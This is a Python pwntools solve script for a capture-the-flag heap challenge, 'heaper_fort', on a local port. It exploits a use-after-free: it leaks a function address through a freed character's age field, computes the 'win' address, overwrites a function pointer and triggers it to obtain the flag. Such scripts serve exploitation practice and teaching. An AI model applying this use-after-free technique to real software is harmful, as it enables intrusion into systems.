from pwn import *

# Set up the target
context.binary = e = ELF("../dist/heaper_fort")

# Remote target
host, port = "localhost", 10203

# Offsets
cast_spell_offset = e.symbols['spell']
win_offset = e.symbols['win']
offset_to_win = win_offset - cast_spell_offset

# Functions to interact with the e
def create_human(p, slot, name, age):
    p.sendlineafter(b"Choice: ", b"1")  # Create character
    p.sendlineafter(b"Choose a character slot (0-4): ", str(slot).encode())
    p.sendlineafter(b"Choice: ", b"5")  # Choose Human
    p.sendlineafter(b"Enter human's name: ", name.encode())
    p.sendlineafter(b"Enter human's age: ", str(age).encode())

def create_sorcerer(p, slot, name):
    p.sendlineafter(b"Choice: ", b"1")  # Create character
    p.sendlineafter(b"Choose a character slot (0-4): ", str(slot).encode())
    p.sendlineafter(b"Choice: ", b"3")  # Choose Sorcerer
    p.sendlineafter(b"Enter sorcerer's name: ", name.encode())

def delete_character(p, slot):
    p.sendlineafter(b"Choice: ", b"2")  # Delete character
    p.sendlineafter(b"Choose a character slot (0-4): ", str(slot).encode())

def read_human_age(p, slot):
    p.sendlineafter(b"Choice: ", b"3")  # Perform action
    p.sendlineafter(b"Choose a character slot (0-4): ", str(slot).encode())
    p.recvuntil(b"Age: ")
    age = int(p.recvline().strip())
    return age

def perform_sorcerer_action(p, slot):
    p.sendlineafter(b"Choice: ", b"3")  # Perform action
    p.sendlineafter(b"Choose a character slot (0-4): ", str(slot).encode())
    p.sendlineafter(b"Choice: ", b"1")  # Cast Spell

# Solve script
def main():
    p = remote(host, port)

    # Step 1: Create Human in slot 1
    create_human(p, slot=1, name="John", age=30)

    # Step 2: Delete Human in slot 1
    delete_character(p, slot=1)

    # Step 3: Create Sorcerer in slot 2
    create_sorcerer(p, slot=2, name="Harry")

    # Step 4: Read age from slot 1 (leaked address)
    leaked_address = read_human_age(p, slot=1)
    log.info(f"Leaked address: {hex(leaked_address)}")

    # Step 5: Calculate the address of `win`
    win_address = leaked_address + offset_to_win
    log.info(f"Win address: {hex(win_address)}")

    # Step 6: Create Sorcerer in slot 3
    create_sorcerer(p, slot=3, name="Hermione")

    # Step 7: Delete Sorcerer in slot 3
    delete_character(p, slot=3)

    # Step 8: Create Human in slot 4 with age = win_address
    create_human(p, slot=4, name="Alice", age=win_address)

    # Step 9: Cast spell (trigger win) from slot 3
    perform_sorcerer_action(p, slot=3)

    # Interact to get the flag
    p.interactive()

if __name__ == "__main__":
    main()
